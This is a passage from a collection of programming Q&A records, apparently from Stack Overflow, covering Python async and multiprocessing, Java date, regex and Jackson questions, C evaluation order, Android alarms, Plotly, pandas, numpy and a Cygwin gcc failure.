ThreadPoolExecutor will successfully prevent the event loop from being blocked, but won't give you the performance improvement you would expect from running code in parallel; especially, when one needs to perform CPU-bound tasks, such as the ones described here (e.g., audio or image processing, machine learning, and so on). It is thus preferable to run CPU-bound tasks in a separate process—using ProcessPoolExecutor, as shown below—which, again, you can integrate with asyncio, in order to await it to finish its work and return the result(s). As described here, it is important to protect the entry point of the program to avoid recursive spawning of subprocesses, etc. Basically, your code must be under if __name__ == '__main__'.
import concurrent.futures

loop = asyncio.get_running_loop()
with concurrent.futures.ProcessPoolExecutor() as pool:
    res = await loop.run_in_executor(pool, cpu_bound_task, contents) 

Again, I'd suggest having a look at the linked answer earlier on how to create a re-usable ProcessPoolExecutor at application startup—you should find this answer helpful as well.

More solutions, as shown in this answer, include using asyncio.create_task() (if your task returns a coroutine and you wouldn't like to await for the task to complete), as well as spawning a new thread or process, using the threading or multiprocessing module, respectively, instead of using concurrent.futures. Moreover, if you had to perform some heavy background computation task that wouldn't necessarily have to be run by the same process (for example, you don't need to share memory, variables, etc.), you could also benefit from using other bigger tools like Celery, as described in FastAPI's documentation. Using apscheduler, as demonstrated in this answer, might be another option as well—always choose what suits you best.

Use more server workers to take advantage of multi-core CPUs, in order to run multiple processes in parallel and be able to serve more requests. For example, uvicorn main:app --workers 4 (if you are using Gunicorn as a process manager with Uvicorn workers, please have a look at this answer). When using 1 worker, only one process is run. When using multiple workers, this will spawn multiple processes (all single threaded). Each process has a separate Global Interpreter Lock (GIL), as well as its own event loop, which runs in the main thread of each process and executes all tasks in its thread. That means, there is only one thread that can take a lock on the interpreter of each process; unless, of course, you employ additional threads, either outside or inside the event loop, e.g., when using a ThreadPoolExecutor with loop.run_in_executor, or defining endpoints/background tasks/StreamingResponse's generators with normal def instead of async def, as well as when calling UploadFile's methods (see the first two paragraphs of this answer for more details).
Note that each worker ""has its own things, variables and memory"". This means that global variables/objects, etc., won't be shared across the processes/workers. In this case, you should consider using a database storage, or  Key-Value stores (Caches), as described here and here. Additionally, note that ""if you are consuming a large amount of memory in your code, each process will consume an equivalent amount of memory"".


",python
start of week for locale,"How do you determine which day of the week is considered the “start” according to a given Locale using Joda-Time?
Point: Most countries use the international standard Monday as first day of week (!). A bunch others use Sunday (notably USA). Others apparently Saturday. Some apparently Wednesday?!
Wikipedia ""Seven-day week""#Week_number
","Joda-Time uses the ISO standard Monday to Sunday week.
It does not have the ability to obtain the first day of week, nor to return the day of week index based on any day other than the standard Monday. Finally, weeks are always calculated wrt ISO rules.
",java
setexactandallowwhileidle for alarmmanager is not working properly,"I am developing an app which needs to perform particular action on the exact time which user has set. For this i am using setExactAndAllowWhileIdle() method because this documentation says that android devices having android 6.0 or above has doze mode concept in which if devices remains idle for some times then it will enter into doze mode and doze mode restricts alarms. If i want to fire my alarm when device is into doze mode then i have setExactAndAllowWhileIdle() method as documentation says. This documentation also contains manual way to enter device into doze mode for testing purpose. so, i am testing using that way but my alarm is not fired when device is into doze mode and when i stops doze mode via terminal command my past alarm will fires instantly. 
So, my problem is that setExactAndAllowWhileIdle() this method is not working in doze mode but it should have to work as said in documentation. I know limitation of this method that i can only fire one alarm per 9 minutes and i am following this rule. So, i can't understand where is the problem.
My Code:
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC, d.getTime(), pendingIntent);
else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
    alarmManager.setExact(AlarmManager.RTC, d.getTime(), pendingIntent);
else
    alarmManager.set(AlarmManager.RTC, d.getTime(), pendingIntent);

Is it a method problem or i am doing it in a wrong way??
","I've found the solution for my problem so, i am posting my own answer here which worked for me.
Using setAlarmClock() method has solved my problem. If you set alarm using setAlarmClock() method then this will not allow the system to go into doze mode before 1 hour of your alarm's time. I had tested this by manually forcing my device to go into doze mode after setting my alarm. Let me explain full scenario.

First of all i set alarm after 5 minutes from current time and then tried to putting my device into doze mode manually by using following command.


adb shell dumpsys deviceidle force-idle

It Shows

unable to enter into doze mode


After that i set alarm after 1 hour and 1 minute from current time and then i have tried to put my device into doze mode and it enters into doze mode successfully. Then i have done nothing on my device and it fires alarm exactly on time even it was in a doze mode.

Hence, i conclude that setAlarmClock() method prevents your device from entering to doze mode if there is a small amount of timestamp between current time and your alarm time. Otherwise if your device is already in doze mode then it will gets exit from doze mode before some time of your alarm so, your alarm works fine.
Updated code:
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
    alarmManager.setAlarmClock(new AlarmManager.AlarmClockInfo(d.getTime(),pendingIntent),pendingIntent);
else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
    alarmManager.setExact(AlarmManager.RTC_WAKEUP, d.getTime(), pendingIntent);
else
    alarmManager.set(AlarmManager.RTC_WAKEUP, d.getTime(), pendingIntent);

",java
simpledateformat with offset not recognized,"I needed to parse below Date coming from a web service.
2014-09-16T18:05:00.000-05:00

So I tried to created SimpleDateFormat object
SimpleDateFormat simpleDateFormat = new SimpleDateFormat
                                   (""yyyy-MM-dd'T'HH:mm:ss.SSSXXX"");

JavaDocs has below example and format given in the table that matches with my date format.
""yyyy-MM-dd'T'HH:mm:ss.SSSXXX""            2001-07-04T12:08:56.235-07:00

However, I am getting below exception. I use jdk 1.7.0_55. Is there something I am missing ?
Caused by: java.lang.IllegalArgumentException: Illegal pattern character 'X'
    at java.text.SimpleDateFormat.compile(SimpleDateFormat.java:768)
    at java.text.SimpleDateFormat.initialize(SimpleDateFormat.java:575)
    at java.text.SimpleDateFormat.<init>(SimpleDateFormat.java:500)
    at java.text.SimpleDateFormat.<init>(SimpleDateFormat.java:475)

","Check the version of Java you're using.  I bet you're actually using 6.
$ java -version
java version ""1.6.0_65""

The XXX format was added in 7.  Compare:
http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html
http://docs.oracle.com/javase/7/docs/api/java/text/SimpleDateFormat.html
",java
regex should not match for two or more consecutive dashes,"I have the following regex:
\p{Alpha}[\p{Alnum}-]+\p{Alnum}

With this, the text should start with an alpha character and could be followed by alphanumerics and dashes.
But I don't want to have two or more consecutive dashes. What is the right regex that I can use for this case?
","You may consider this regex solution:
^\p{Alpha}\p{Alnum}*(?:-\p{Alnum}+)*$

RegEx Demo
RegEx Details:

^: Start
\p{Alpha}: Match an alphabet
\p{Alnum}*: Match 0 or more alphanumeric characters
(?:-\p{Alnum}+)*: Match - followed by 1+ of alphanumeric characters. Repeat this group 0 or more times
$: End

",java
what are jsontypeinfo and jsonsubtypes used for in jackson,"What are the @JsonTypeInfo and @JsonSubTypes annotations used for in Jackson?
public class Lion extends Animal {

private String name;

@JsonCreator
public Lion(@JsonProperty(""name"") String name) {
    this.name = name;
}

public String getName() {
    return name;
}

public String getSound() {
    return ""Roar"";
}

public String getType() {
    return ""carnivorous"";
}

public boolean isEndangered() {
    return true;
}

@Override
public String toString() {
    return ""Lion [name="" + name + "", getName()="" + getName() + "", getSound()="" + getSound() + "", getType()="" + getType() + "", isEndangered()=""
            + isEndangered() + ""]"";
}

}

========================================
public class Elephant extends Animal {

@JsonProperty
private String name;

@JsonCreator
public Elephant(@JsonProperty(""name"") String name) {
    this.name = name;
}

public String getName() {
    return name;
}

public String getSound() {
    return ""trumpet"";
}

public String getType() {
    return ""herbivorous"";
}

public boolean isEndangered() {
    return false;
}

@Override
public String toString() {
    return ""Elephant [name="" + name + "", getName()="" + getName() + "", getSound()="" + getSound() + "", getType()="" + getType()
            + "", isEndangered()="" + isEndangered() + ""]"";
}
}

==============================================
@JsonTypeInfo (use = JsonTypeInfo.Id.CLASS, include = As.PROPERTY, property = ""classNameExtenral"")
@JsonSubTypes ({@Type (value = Lion.class, name = ""lion""), @Type (value = Elephant.class, name = ""elephant"")})

public abstract class Animal {

@JsonProperty (""name"")
String name;
@JsonProperty (""sound"")
String sound;
@JsonProperty (""type"")
String type;
@JsonProperty (""endangered"")
boolean endangered;
}

public static void main(String[] args){
    Lion lion = new Lion(""Simba"");
    Elephant elephant = new Elephant(""Manny"");
    List<Animal> animals = new ArrayList<>();
    animals.add(lion);
    animals.add(elephant);
}

What I understand is that it additionally preserves the concrete type of object being serialised along with the actual data.
What is not clear to me is what is the actual advantage/gain during deserialization.
Not getting any significant documentation apart from the java docs. Can anyone please help out here or provide some docs around the same.
","The purpose of these annotations is to support polymorphism on deserialization.  When deserializing the actual code being executed will know the class of what it expects.  E.g., the type of some field being deserialized into.  But if that class has subclasses (i.e., subtypes) how does the generic Jackson deserializer know which actual class the string being deserialized is?  It's got to create an instance of some concrete type (the class or one of its subclasses) and fill it up.  The only way it can know which one to create is if that information is written into the serialization in the first place.
As this answer says there are three ways to do it - you pick the one that's appropriate for your use case.  @JsonTypeInfo + @JsonSubtypes is one of those ways - it works great when you know, at compile time, all of the possible subtypes that could exist for the class in question.
",java
is the right hand side of an assignment operator always evaluated first,"Will right side always evaluated to ahead of left side? And then the result of right side will be passed on to left side. I am not talking about the exception such as A[i]=i++
I am talking about the normal cases: 
A[i] = (j+32+43 & K); 
A[j] != (A[j] + A[k]); 

will the right part of all these expression evaluated first and then the result is compared to the left side? (Always)
","In general the order of evaluation of sub-expressions is unspecified, there are a few exceptions such as logical and, logical or, comma operator, etc...
Since you comment stated you are interested in the general rule:

any operstor @YuHao if there is any general rule

that would be covered by the draft C99 standard section 6.5 Expressions paragraph 3 which says (emphasis mine going forward):

The grouping of operators and operands is indicated by the syntax.74)
  Except as specified later (for the function-call (), &&, ||, ?:, and
  comma operators), the order of evaluation of subexpressions and the
  order in which side effects take place are both unspecified.

this is basically the same in the draft C11 standard expect C11 does not list the exceptions so quoting C99 is more convenient. Paragraph 3 in C11 says:

The grouping of operators and operands is indicated by the syntax.85)
  Except as specified later, side effects and value computations of
  subexpressions are unsequenced.86)

Specifically for assignment operators C99 says:

The order of evaluation of the operands is unspecified [...]

and C11 says:

[...] The evaluations of the operands are unsequenced.

",c
debugging gan covergence,"Building a GAN to generate images. The images have 3 color channels, 96 x 96.
The images that are generated by the generator at the beginning are all black, which is an issue given that is statistically highly unlikely.
Also, the loss for both networks is not improving.
I have posted the entire code below, and commented to allow it to be easily read. This is my first time building a GAN and I am new to Pytorch so any help is very appreciated!
import torch
from torch.optim import Adam
from torch.utils.data import DataLoader
from torch.autograd import Variable

import numpy as np
import os
import cv2
from collections import deque

# training params
batch_size = 100
epochs = 1000

# loss function
loss_fx = torch.nn.BCELoss()

# processing images
X = deque()
for img in os.listdir('pokemon_images'):
    if img.endswith('.png'):
        pokemon_image = cv2.imread(r'./pokemon_images/{}'.format(img))
        if pokemon_image.shape != (96, 96, 3):
            pass
        else:
            X.append(pokemon_image)

# data loader for processing in batches
data_loader = DataLoader(X, batch_size=batch_size)

# covert output vectors to images if flag is true, else input images to vectors
def images_to_vectors(data, reverse=False):
    if reverse:
        return data.view(data.size(0), 3, 96, 96)
    else:
        return data.view(data.size(0), 27648)

# Generator model
class Generator(torch.nn.Module):
    def __init__(self):
        super(Generator, self).__init__()
        n_features = 1000
        n_out = 27648
        
        self.model = torch.nn.Sequential(
                torch.nn.Linear(n_features, 128),
                torch.nn.ReLU(),
                torch.nn.Linear(128, 256),
                torch.nn.ReLU(),
                torch.nn.Linear(256, 512),
                torch.nn.ReLU(),
                torch.nn.Linear(512, 1024),
                torch.nn.ReLU(),
                torch.nn.Linear(1024, n_out),
                torch.nn.Tanh()
        )


    def forward(self, x):
        img = self.model(x)
        return img

    def noise(self, s):
       x = Variable(torch.randn(s, 1000))
       return x


# Discriminator model
class Discriminator(torch.nn.Module):
    def __init__(self):
        super(Discriminator, self).__init__()
        n_features = 27648
        n_out = 1

        self.model = torch.nn.Sequential(
                torch.nn.Linear(n_features, 512),
                torch.nn.ReLU(),
                torch.nn.Linear(512, 256),
                torch.nn.ReLU(),
                torch.nn.Linear(256, n_out),
                torch.nn.Sigmoid()
        )


    def forward(self, img):
        output = self.model(img)
        return output


# discriminator training
def train_discriminator(discriminator, optimizer, real_data, fake_data):
    N = real_data.size(0)
    optimizer.zero_grad()

    # train on real
    # get prediction
    pred_real = discriminator(real_data)

    # calculate loss
    error_real = loss_fx(pred_real, Variable(torch.ones(N, 1)))
    
    # calculate gradients
    error_real.backward()

    # train on fake
    # get prediction
    pred_fake = discriminator(fake_data)

    # calculate loss
    error_fake = loss_fx(pred_fake, Variable(torch.ones(N, 0)))

    # calculate gradients
    error_fake.backward()

    # update weights
    optimizer.step()
    
    return error_real + error_fake, pred_real, pred_fake


# generator training
def train_generator(generator, optimizer, fake_data):
    N = fake_data.size(0)

    # zero gradients
    optimizer.zero_grad()

    # get prediction
    pred = discriminator(generator(fake_data))

    # get loss
    error = loss_fx(pred, Variable(torch.ones(N, 0)))

    # compute gradients
    error.backward()

    # update weights
    optimizer.step()

    return error


# Instance of generator and discriminator
generator = Generator()
discriminator = Discriminator()

# optimizers
g_optimizer = torch.optim.Adam(generator.parameters(), lr=0.001)
d_optimizer = torch.optim.Adam(discriminator.parameters(), lr=0.001)

# training loop
for epoch in range(epochs):
     for n_batch, batch in enumerate(data_loader, 0):
         N = batch.size(0)

         # Train Discriminator

         # REAL
         real_images = Variable(images_to_vectors(batch)).float()

         # FAKE
         fake_images = generator(generator.noise(N)).detach()

         # TRAIN
         d_error, d_pred_real, d_pred_fake = train_discriminator(
                 discriminator,
                 d_optimizer,
                 real_images,
                 fake_images
         )

         # Train Generator

         # generate noise
         fake_data = generator.noise(N)

         # get error based on discriminator
         g_error = train_generator(generator, g_optimizer, fake_data)

         # convert generator output to image and preprocess to show
         test_img = np.array(images_to_vectors(generator(fake_data), reverse=True).detach())
         test_img = test_img[0, :, :, :]
         test_img = test_img[..., ::-1]

         # show example of generated image
         cv2.imshow('GENERATED', test_img[0])
         if cv2.waitKey(1) & 0xFF == ord('q'):
             break

     print('EPOCH: {0}, D error: {1}, G error: {2}'.format(epoch, d_error, g_error))


cv2.destroyAllWindows()

# save weights
# torch.save('weights.pth')

","One can't really easily debug your training without the data and so on, but a possible problem is that your generator's last layer is a Tanh(), which means output values between -1 and 1. You probably want:

To have your real images normalized to the same range, e.g. in train_discriminator(): 
# train on real
pred_real = discriminator(real_data * 2. - 1.) # supposing real_data in [0, 1]

To re-normalize your generated data to [0, 1] before visualization/use.
# convert generator output to image and preprocess to show
test_img = np.array(
    images_to_vectors(generator(fake_data), reverse=True).detach())
test_img = test_img[0, :, :, :]
test_img = test_img[..., ::-1]
test_img = (test_img + 1.) / 2.


",python
pymongo async client not raising exception when connection fails,"It seems that a pymongo 4.10 async client does not raise an exception when there is a problem with the connection.
Taken from the doc, a test without any mongo DB running locally yields:
>>> import asyncio
>>> from pymongo import AsyncMongoClient
>>> client = AsyncMongoClient('mongodb://localhost:27017/')
>>> asyncio.run(client.aconnect())
# no errors

When activating debug logs I see the connection being refused but I would expect an exception to be raised.
>>> import logging
>>> logging.basicConfig(level='DEBUG')
>>> asyncio.run(client.aconnect())
DEBUG:asyncio:Using selector: KqueueSelector
DEBUG:pymongo.topology:{""topologyId"": {""$oid"": ""676020be62e71d3fe6f27721""}, ""serverHost"": ""localhost"", ""serverPort"": 27017, ""awaited"": false, ""durationMS"": 2.786167000522255, ""failure"": ""\""AutoReconnect('localhost:27017: [Errno 61] Connection refused (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')\"""", ""message"": ""Server heartbeat failed""}

I would expect the DEBUG log error to be an exception. Am I misunderstanding something with the async client ?
","The mongo client uses connection pools etc in the background, even though you tell it to explicitly connect (why?) it doesn't raise an exception for failing to connect until you actually try to read or write from/to the DB.
But you can check if/where it's connected:
>>> list(client.nodes)
[('10.0.0.1', 27017)]

The result will be an empty list if aconnect fails.
But if you try any communication such as:
>>> await client.server_info()

... you will get an exception:
pymongo.errors.ServerSelectionTimeoutError: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 1.9985503089847043s, Topology Description: <TopologyDescription id: 6760281eda9a9980ea35e425, topology_type: Unknown, servers: [<ServerDescription ('localhost', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>

The pymongo async driver is just built like this.. why the tutorial tells you to use aconnect() ... I have no idea. I didn't even know it existed.
Btw, you can use python -m async to get a REPL where you can run async commands without asyncio.run()
",python
update x and y values of a trace using plotlyupdate,"Is it possible to update the x and y properties of a trace using Plotly.update()?  
Updating the marker.color property of the trace works well. But when I try updating the x or y properties the trace disappears from the graph. And there is no indication that something went wrong in the console. I would like to update the values by trace index and the update function looks like the right tool.
There may be a clue in the documentation for Plotly.react(): 

Important Note: In order to use this method to plot new items in arrays under  data  such as  x  or  marker.color  etc, these items must either have been added immutably (i.e. the identity of the parent array must have changed) or the value of layout.datarevision must have changed.  

Though this may the complete unrelated because I am able to update marker.color using Plotly.update() without bumping the layout.datarevision.  
Running example:
(codepen example here)


let myPlot = document.getElementById(""graph"");_x000D_
_x000D_
let trace = {_x000D_
  type: 'scatter',_x000D_
  x: [0.5 * 255],_x000D_
  y: [0.5 * 255],_x000D_
  hoverinfo: ""skip"",_x000D_
  mode: 'markers',_x000D_
  marker: {color: ""DarkSlateGrey"", size: 20},_x000D_
};_x000D_
_x000D_
let layout = {_x000D_
  title: ""The Worm Hole"",_x000D_
  yaxis: { range: [0, 255] },_x000D_
  xaxis: { range: [0, 255] },_x000D_
};_x000D_
_x000D_
let config = {responsive: true};_x000D_
_x000D_
Plotly.newPlot(myPlot, [trace], layout, config);_x000D_
_x000D_
function updateGraphPoint(cmd) {_x000D_
  let x = Math.random() * 255;_x000D_
  let y = Math.random() * 255;_x000D_
  let z = Math.random() * 255;_x000D_
  let update = null;_x000D_
  if (cmd === ""color"") {_x000D_
    update = {'marker.color': `rgb(${x}, ${y}, ${z})`};_x000D_
  } else if (cmd === ""position"") {_x000D_
    update = {'x': [x], 'y': [y]};_x000D_
  }_x000D_
  Plotly.update(myPlot, update, {}, [0]);_x000D_
}
<script src=""https://cdn.plot.ly/plotly-latest.min.js""></script>_x000D_
<button onclick=""updateGraphPoint('color')"">Change my color!</button>_x000D_
<button onclick=""updateGraphPoint('position')"">Change my position!</button>_x000D_
<div id=""graph""></div>



Note: I also asked this question on the the plotly community forum but have not gotten any responses. Maybe someone here knows. 
","The data update object accepts an array containing an array of new x / y values for each trace you want to update. I.e. if you only want to update one trace, you still have to provide an array containing an array for that one trace:
update = {'x': [[x]], 'y': [[y]]};


let myPlot = document.getElementById(""graph"");_x000D_
_x000D_
let trace = {_x000D_
  type: 'scatter',_x000D_
  x: [0.5 * 255],_x000D_
  y: [0.5 * 255],_x000D_
  hoverinfo: ""skip"",_x000D_
  mode: 'markers',_x000D_
  marker: {color: ""DarkSlateGrey"", size: 20},_x000D_
};_x000D_
_x000D_
let layout = {_x000D_
  title: ""The Worm Hole"",_x000D_
  yaxis: { range: [0, 255] },_x000D_
  xaxis: { range: [0, 255] },_x000D_
};_x000D_
_x000D_
let config = {responsive: true};_x000D_
_x000D_
Plotly.newPlot(myPlot, [trace], layout, config);_x000D_
_x000D_
function updateGraphPoint(cmd) {_x000D_
  let x = Math.random() * 255;_x000D_
  let y = Math.random() * 255;_x000D_
  let z = Math.random() * 255;_x000D_
  let update = null;_x000D_
  if (cmd === ""color"") {_x000D_
    update = {'marker.color': `rgb(${x}, ${y}, ${z})`};_x000D_
  } else if (cmd === ""position"") {_x000D_
    update = {'x': [[x]], 'y': [[y]]};_x000D_
  }_x000D_
  Plotly.update(myPlot, update, {}, [0]);_x000D_
}
<script src=""https://cdn.plot.ly/plotly-latest.min.js""></script>_x000D_
<button onclick=""updateGraphPoint('color')"">Change my color!</button>_x000D_
<button onclick=""updateGraphPoint('position')"">Change my position!</button>_x000D_
<div id=""graph""></div>



",javascript
aggregate data by date in java stream,"I have a List of StatisticsItem (String context, Integer numberOfHits, String yyyyMM).
An example of instance is context=WEBSITE, numberOfHits=12456, yyyyMM=""2019-06"". 
I want to get a sorted Map<String, Integer> which has as key the yyyyMM date and as value the aggregated number of hits for this month.
I try this kind of code but I can't fill the blanks :
Map<String, Integer> collect = 
      list.stream()
          .sorted((s1, s2) -> s1.getYearAndMonth().compareTo(s2.getYearAndMonth()))
          ./* TODO: What method ? */((s1, s2) -> s1.getYearAndMonth().equals(s2.getYearAndMonth())
            ? new StatisticsItem(s1.getNumberOfHits() + s2.getNumberOfHits(), s1.getYearAndMonth()) // Construct new StatistictsItem without ""context""
            : /* TODO: don't touch data with different dates */)
    .collect(Collectors.toMap(s -> s.getYearAndMonth(), s -> s.getNumberOfHits()));

Input : 
{context=""WEBSITE"", numberOfHits=500, yyyyMM=""2019-04"", 
context=""WEBSITE"", numberOfHits=750, yyyyMM=""2019-05"", 
context=""WEBSITE"", numberOfHits=470, yyyyMM=""2019-06"",
context=""REST"", numberOfHits=5400, yyyyMM=""2019-04"", 
context=""REST"", numberOfHits=4700, yyyyMM=""2019-05"", 
context=""REST"", numberOfHits=9700, yyyyMM=""2019-06""}

Desired output (context can be null or whatever else in this case) :
{context=null, numberOfHits=5900, yyyyMM=""2019-04"", 
context=null, numberOfHits=5450, yyyyMM=""2019-05"", 
context=null, numberOfHits=10170, yyyyMM=""2019-06""}

","You can just group by the date field.
list.stream().groupingBy(StatisticsItem::getYyyyMM, 
              Collectors.mapping(StatisticsItem::getNumberOfHits, Collectors.summingInt(Integer::intValue)))

Then you have a Map<String, Integer> with [yyyyMM - count] entries.
",java
how to wait all promise are resolve in a loop,"async function getSomething(parameter) {
  ...
}

function myFunction() {
  const params = [param1, param2, ...]
  const results = []
  let i = 0

  params.forEach((param) => {
    getSomething(param).then((result) => results[i++] = result)
  })
  
  console.log(results)
}

results is empty because the calls in the for are asynchronous and not yet executed.
How can I wait that all Promise in the for loop are resolved ?
","You can use Promise.all to your advantage. It will allow you to wait until an array of promises gets resolved.
Refer the below code for reference:


async function getSomething(parameter) {
  // Your business logic here
}

async function myFunction() {
  const params = [param1, param2, ...];
  const results = await Promise.all(params.map(param => getSomething(param))); // Use Promise.all get the results in order
  console.log(results);
}



",javascript
convert pandas multiindex series to json python,"Hi I have two pandas series similar to below
PnL 
           Product Name      Price
Company A  Orange            3000
Company B  Apple             2000
           Grapes            1000

Tax
           Product Name      Price
Company A  Orange            100
Company B  Apple             100
           Grapes            10

I would like to transform the pandas series into the following JSON format
{'PnL':{'Company A':{'productName':'Orange','price':3000},
        'Company B':[{'productName':'Apple','price':2000},
                     {'productName':'Grapes','price':1000}]
       },
 'Tax':{'Company A':{'productName':'Orange','price':100},
        'Company B':[{'productName':'Apple','price':100},
                     {'productName':'Grapes','price':10}]
       }
}

I have tried to use the code below
convertedJson = json.dumps([{'company': k[0], 'productName':k[1],'price': v} for k,v in df.items()])

but I cannot form the JSON which I want to produce.
Thank you for your help
","You can use concat for join DataFrames together and then groupby with to_dict for expected output:
df = pd.concat([s1, s2], keys=('PnL','Tax')).reset_index()
df.columns = ['type','company','productName','price']
print (df)
  type    company productName  price
0  PnL  Company A      Orange   3000
1  PnL  Company B       Apple   2000
2  PnL  Company B      Grapes   1000
3  Tax  Company A      Orange   3000
4  Tax  Company B       Apple   2000
5  Tax  Company B      Grapes   1000

d = (df.groupby(['type','company'])['productName','price']
       .apply(lambda x: x.to_dict('r'))
       .reset_index(name='data')
       .groupby('type')['company','data']
       .apply(lambda x: x.set_index('company')['data'].to_dict())
       .to_json()
       )


print (d)

{
    ""PnL"": {
        ""Company A"": [{
            ""productName"": ""Orange"",
            ""price"": 3000
        }],
        ""Company B"": [{
            ""productName"": ""Apple"",
            ""price"": 2000
        }, {
            ""productName"": ""Grapes"",
            ""price"": 1000
        }]
    },
    ""Tax"": {
        ""Company A"": [{
            ""productName"": ""Orange"",
            ""price"": 3000
        }],
        ""Company B"": [{
            ""productName"": ""Apple"",
            ""price"": 2000
        }, {
            ""productName"": ""Grapes"",
            ""price"": 1000
        }]
    }
}

",python
python osenviron osputenv usrbinenv,"I want to ensure os.system('env') not contain some specific variable myname
which is export in ~/.bashrc as export myname=csj
Therefore, I wrote below python code:
import os

def print_all():
    print ""os.environ['myname']=%s"" % os.environ.get('myname')
    print ""os.getenv('myname')=%s"" % os.getenv('myname')
    os.system('env | grep myname')
    print

def delete_myname():
    if 'myname' in os.environ: os.environ.pop('myname')
    if os.getenv('myname'): os.unsetenv('myname')

print_all()

os.putenv('myname', 'csj2')
print ""---------------------""
delete_myname()
print_all()

os.putenv('myname', 'csj3')
print ""---------------------""
delete_myname()
print_all()

I think examine both os.environ['myname'] and os.getenv('myname') 
and then delete them if exist, 
can ensure os.system('env | grep myname') get nothing.
However, the result is:
os.environ['myname']=csj
os.getenv('myname')=csj
myname=csj

---------------------
os.environ['myname']=None
os.getenv('myname')=None

---------------------
os.environ['myname']=None
os.getenv('myname')=None
myname=csj3

I don't understand why I still got csj3 on os.system('env | grep myname')?
","From the docs:

Note: Calling putenv() directly does not change os.environ, so it’s better to modify os.environ.

For unsetenv there is a similar warning:

however, calls to unsetenv() don’t update os.environ, so it is actually preferable to delete items of os.environ.

getenv just returns the value from os.environ as its implementation shows, so by using it you get into a state where it seems the value isn't set when you look it up from python, while it actually is in the real environment. The only way to get it now I can think of would be to call the C getenv function using C types...
If i modify your code to use os.environ instead of calling putenv/unsetenv everything works as expected:
import os

def print_all():
    print ""os.environ['myname']=%s"" % (os.environ['myname'] if 'myname' in os.environ else ""None"")
    os.system('env | grep myname')
    print

def delete_myname():
    if 'myname' in os.environ: os.environ.pop('myname')

print_all()

os.environ['myname'] = 'csj2'
print ""---------------------""
print_all()
delete_myname()
print_all()

os.environ['myname'] = 'csj3'
print ""---------------------""
print_all()
delete_myname()
print_all()

output:
$ myname=somevalue python2 test.py 
os.environ['myname']=somevalue
myname=somevalue

---------------------
os.environ['myname']=csj2
myname=csj2

os.environ['myname']=None

---------------------
os.environ['myname']=csj3
myname=csj3

os.environ['myname']=None

",python
how to retain the index of an array element after flattening and sorting into descending order using sort,"I have a 2D array of integers. I need to find the largest value within the entire array along with its index.
Currently I am flattening the array and then using the sort() function to find the highest value. The problem is my array has multiples (12,000,000+ elements) so after sorting I don't know how to recover the index.
maskingarray = Data.copy()
flatmask = maskingarray.flatten()
flatmask.sort()

This code allows me to access the element with the highest value but I need but the position in the 2D array also.
Is there a better method which allows me to retain the indexing of the original array? Preferably just finding the largest value without having to flatten at all.
(For context: I need the indexing because I am doing aperture photometry, essentially finding a galaxy with the highest luminosity and looking at a radius around it)
Thanks for any help
","This is similar to prior questions, and I think the answer is in [this one][1]
https://stackoverflow.com/questions/5469286/how-to-get-the-index-of-a-maximum-element-in-a-numpy-array-along-one-axis
There is an elegant solution using Numpy [argmax][1]
[1]: https://numpy.org/doc/stable/reference/generated/numpy.argmax.html
an argmax solution:
>>> import numpy as np
>>> a = np.array([[1,2,3],[4,3,1]])
>>> i,j = np.unravel_index(a.argmax(), a.shape)
>>> [i,j]
[1,0]
>>> a[i,j]
4

",python
gcc compiler in cygwin does not execute properly gives up,"The gcc compiler in cygwin does not execute properly (gives up?) from any folder but /bin. For instance, attempting to compile my code from /bin works, but from /bin/myprogram using the verbose option I get the following message from the compiler:  
gcc version 4.5.3 (GCC)
COLLECT_GCC_OPTIONS='-O' '-ansi' '-v' '-c' '-mtune=generic' '-march=i686'
 /usr/lib/gcc/i686-pc-cygwin/4.5.3/cc1.exe -quiet -v -D__CYGWIN32__ -D__CYGWIN__ -D__unix__ -D__unix -idirafter /usr/lib/gcc/i686-pc-cygwin/4.5.3/../../../../include/w32api -idirafter /usr/lib/gcc/i686-pc-cygwin/4.5.3/../../../../i686-pc-cygwin/lib/../../include/w32api sb.c -quiet -dumpbase sb.c -mtune=generic -march=i686 -ansi -auxbase sb -O -ansi -version -o /tmp/ccyhmnJp.s
Makefile:101: recipe for target `sb.o' failed
make: *** [sb.o] Error 1

Other people have reported similar problems:
http://cygwin.com/ml/cygwin/2010-01/msg00939.html
The solution appears to be to modify the path, although ""remove X from the path"" sounds like a temporary (and strange) workaround, not a permanent solution, and I don't know what to remove. Regardless I ran cygcheck from /bin and from /bin/myprogram (in which I want to compile). The output follows.  
From /bin:
$ cygcheck /usr/lib/gcc/i686-pc-cygwin/4.5.3/cc1.exe
C:\cygwin\lib\gcc\i686-pc-cygwin\4.5.3\cc1.exe
  C:\cygwin\bin\cygcloog-0.dll
    C:\cygwin\bin\cygwin1.dll
      C:\WINDOWS\system32\KERNEL32.dll
        C:\WINDOWS\system32\ntdll.dll
    C:\cygwin\bin\cyggmp-10.dll
    C:\cygwin\bin\cygppl_c-4.dll
      C:\cygwin\bin\cygppl-9.dll
        C:\cygwin\bin\cyggcc_s-1.dll
        C:\cygwin\bin\cygstdc++-6.dll
        C:\cygwin\bin\cyggmpxx-4.dll
      C:\cygwin\bin\cygpwl-5.dll
  C:\cygwin\bin\cyggmp-3.dll
  C:\cygwin\bin\cygiconv-2.dll
  C:\cygwin\bin\cygintl-8.dll
  C:\cygwin\bin\cygmpc-1.dll
    C:\cygwin\bin\cygmpfr-1.dll
  C:\cygwin\bin\cygmpfr-4.dll
  C:\cygwin\bin\cygppl_c-2.dll
    C:\cygwin\bin\cygppl-7.dll
  C:\cygwin\bin\cygz.dll

From /bin/myprogram:
$ cygcheck /usr/lib/gcc/i686-pc-cygwin/4.5.3/cc1.exe
C:\cygwin\lib\gcc\i686-pc-cygwin\4.5.3\cc1.exe
  C:\cygwin\bin\cygcloog-0.dll
    C:\cygwin\usr\local\bin\cygwin1.dll
      C:\WINDOWS\system32\ADVAPI32.DLL
